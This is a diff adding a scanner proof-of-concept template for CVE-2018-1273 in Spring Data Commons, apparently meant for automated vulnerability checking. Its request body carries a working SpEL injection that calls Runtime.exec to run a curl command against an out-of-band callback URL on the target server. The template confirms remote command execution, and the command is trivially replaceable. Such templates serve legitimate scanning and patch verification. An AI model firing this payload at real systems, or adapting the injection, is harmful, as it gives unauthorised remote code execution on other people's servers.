@@ -1,0 +1,22 @@
+name: poc-yaml-spring-data-commons-cve-2018-1273
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseUrl: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /users
+            body: |
+                username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl {{reverseUrl}}")]=&password=&repeatedPassword=
+        expression: |
+            reverse.wait(5)
+expression: |
+    r0()
+detail:
+    author: nobody
+    links:
+        - https://xz.aliyun.com/t/10039
